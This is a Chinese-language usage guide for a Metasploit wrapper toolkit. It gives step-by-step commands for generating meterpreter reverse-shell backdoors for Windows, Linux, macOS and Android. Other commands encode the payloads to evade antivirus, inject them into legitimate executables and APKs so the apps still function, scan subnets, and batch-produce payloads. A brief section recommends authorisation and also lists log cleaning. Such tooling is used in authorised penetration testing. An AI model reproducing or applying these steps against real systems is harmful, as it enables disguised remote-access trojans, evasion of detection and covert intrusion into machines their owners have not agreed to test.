# Ultimate MSF Toolkit 使用示例

## 快速开始

### 1. 安装和启动
```bash
# 安装
chmod +x install.sh
./install.sh

# 启动交互模式
python main.py
```

### 2. 生成 Windows Payload
```bash
# 方法1: 交互模式
python main.py
> 选择: 1 (Payload 生成)
> 选择: 1 (快速生成)
> 平台: 1 (windows)
> LHOST: 192.168.1.10
> LPORT: 4444

# 方法2: 也可以通过菜单手动输入payload类型
> 选择高级生成，输入 windows/meterpreter/reverse_tcp
```

### 3. 扫描目标
```bash
# 交互模式
python main.py
> 选择: 4 (扫描工具)
> 选择: 1 (端口扫描)
> 目标IP: 192.168.1.100
> 端口范围: 1-1000
> 线程数: 20
```

### 4. 完整渗透测试
```bash
# 命令行模式 (推荐)
python main.py -t 192.168.1.100

# 或交互模式
python main.py
> 选择: 6 (完整渗透测试)
> 目标IP: 192.168.1.100
```

## 常用场景

### 场景1: 内网渗透测试

#### 步骤1: 生成后门
```bash
python main.py
> 1. Payload 生成 > 1. 快速生成
> 平台: windows
> LHOST: 192.168.1.10 (你的IP)
> LPORT: 4444
> 输出文件: backdoor.exe
> 生成 handler: y
```

#### 步骤2: 启动监听
```bash
msfconsole -r backdoor.exe.rc
```

#### 步骤3: 扫描内网
```bash
python main.py
> 4. 扫描工具 > 8. 完整扫描
> 目标: 192.168.1.0/24
```

### 场景2: Web应用测试

#### 步骤1: 扫描Web服务
```bash
python main.py
> 4. 扫描工具 > 2. 服务检测
> 目标: target.com
```

#### 步骤2: 漏洞扫描
```bash
python main.py
> 4. 扫描工具 > 3. 漏洞扫描
> 目标: target.com
> 类型: 2 (Web扫描)
```

#### 步骤3: 生成报告
```bash
python main.py
> 5. 报告生成 > 1. 生成HTML报告
```

### 场景3: Linux服务器渗透

#### 生成 Linux Payload
```bash
python main.py
> 1. Payload 生成 > 2. 高级生成
> Payload: linux/x64/meterpreter/reverse_tcp
> LHOST: 192.168.1.10
> LPORT: 4444
> 输出文件: payload.elf
> 输出格式: elf
> 编码器: y
> 编码器名称: x64/xor_dynamic
> 迭代次数: 3
```

### 场景4: Android APP测试

#### 生成 APK 后门
```bash
python main.py
> 1. Payload 生成 > 2. 高级生成
> Payload: android/meterpreter/reverse_tcp
> LHOST: 192.168.1.10
> LPORT: 4444
> 输出文件: app.apk
> 输出格式: apk
> 使用模板: y
> 模板文件: /path/to/original.apk
```

### 场景5: 批量目标管理

#### 导入目标列表
```json
// targets.json
[
  {
    "ip": "192.168.1.100",
    "hostname": "server1",
    "os": "Windows Server 2019",
    "notes": "Web服务器"
  },
  {
    "ip": "192.168.1.101",
    "hostname": "server2",
    "os": "Ubuntu 20.04",
    "notes": "数据库服务器"
  }
]
```

```bash
python main.py
> 3. 目标管理 > 5. 导入目标列表
> 文件路径: targets.json
```

## 高级用法

### 自定义编码
```bash
# Shikata Ga Nai 编码 (Windows)
Payload: windows/meterpreter/reverse_tcp
编码器: x86/shikata_ga_nai
迭代次数: 5

# XOR 编码 (Linux)
Payload: linux/x64/shell/reverse_tcp
编码器: x64/xor_dynamic
迭代次数: 3
```

### 模板注入
```bash
# 将 payload 注入到正常程序
Payload: windows/meterpreter/reverse_tcp
使用模板: y
模板文件: /path/to/legitimate.exe
# 会保持原程序功能
```

### 坏字符处理
```bash
# 避免 NULL 字节和换行符
Payload: windows/shell/reverse_tcp
坏字符: \x00\x0a\x0d
```

### 代理配置
```bash
python main.py
> 7. 设置 > 1. 代理设置
> 代理类型: 1 (HTTP/HTTPS)
> 服务器: 127.0.0.1
> 端口: 7890
```

### 模块搜索
```bash
# 搜索 Windows exploit
python main.py
> 2. 模块管理 > 2. 搜索模块
> 关键词: windows
> 类型: exploits
> 平台: windows
```

### 自动化脚本

#### 批量扫描
```bash
#!/bin/bash
# scan_subnet.sh

for i in {1..254}; do
    python main.py -t 192.168.1.$i
done
```

#### 生成多个 Payload
```bash
#!/bin/bash
# generate_payloads.sh

LHOST="192.168.1.10"

# Windows
python main.py -p windows/meterpreter/reverse_tcp \
    -l $LHOST -P 4444 -o windows_payload.exe

# Linux
python main.py -p linux/x64/meterpreter/reverse_tcp \
    -l $LHOST -P 4445 -o linux_payload.elf

# macOS
python main.py -p osx/x64/meterpreter/reverse_tcp \
    -l $LHOST -P 4446 -o macos_payload
```

## 报告示例

### HTML 报告结构
```
报告标题: 渗透测试报告
元数据:
  - 生成时间
  - 工具版本
  - 目标数量

目标信息:
  - IP 地址
  - 主机名
  - 操作系统
  - 端口扫描结果
  - 服务检测结果
  - 漏洞扫描结果
  - OS 检测结果
```

### 自动生成全格式报告
```bash
python main.py
> 5. 报告生成 > 5. 生成所有格式报告
# 会生成:
# - report_YYYYMMDD_HHMMSS.html
# - report_YYYYMMDD_HHMMSS.json
# - report_YYYYMMDD_HHMMSS.txt
# - report_YYYYMMDD_HHMMSS.md
```

## 技巧和最佳实践

### 1. 权限管理
```bash
# 需要 root 的功能
- SYN 扫描
- 原始套接字
- 某些枚举

# 运行方式
sudo python main.py
```

### 2. 性能优化
```bash
# 端口扫描
- 小范围: 线程数 10-20
- 大范围: 线程数 50-100
- 全端口: 考虑使用 masscan

# 缓存管理
- 定期更新模块 (每周)
- 清除旧缓存
```

### 3. 网络问题
```bash
# 无法访问外网
> 7. 设置 > 1. 代理设置

# 超时问题
编辑 scanner.py
timeout=60  # 增加超时时间
```

### 4. 数据备份
```bash
# 备份目标数据
python main.py
> 3. 目标管理 > 6. 导出目标列表

# 备份缓存
tar -czf msf_cache_backup.tar.gz .msf_cache/
```

## 故障排除

### 问题1: Metasploit 未找到
```bash
# 检查安装
which msfconsole
which msfvenom

# 如果未安装
./install.sh
# 或手动安装
```

### 问题2: 模块获取失败
```bash
# 清除缓存重试
python main.py --clear-cache

# 强制更新
python main.py -u
```

### 问题3: 扫描超时
```bash
# 减小扫描范围
端口: 1-100 (而不是 1-65535)

# 减少线程数
线程: 10 (而不是 100)

# 增加超时
修改 scanner.py 中的 timeout 参数
```

### 问题4: 权限不足
```bash
# Linux/macOS
sudo python main.py

# Windows
右键 > 以管理员身份运行
```

## 安全注意事项

1. **合法授权**: 只测试有权限的系统
2. **数据保护**: 报告包含敏感信息
3. **网络隔离**: 在隔离环境测试
4. **日志清理**: 测试后清理日志
5. **工具更新**: 保持工具和 MSF 更新

## 更多资源

- Metasploit 官方文档: https://docs.metasploit.com/
- MSF 模块开发: https://docs.metasploit.com/docs/development/
- Payload 列表: `msfvenom --list payloads`
- Encoder 列表: `msfvenom --list encoders`

## 获取帮助

```bash
# 查看版本
python main.py -v

# 查看帮助
python main.py -h

# 查看统计
python main.py -s
```

## 社区和反馈

- GitHub Issues
- 功能请求
- Bug 报告
- 贡献代码
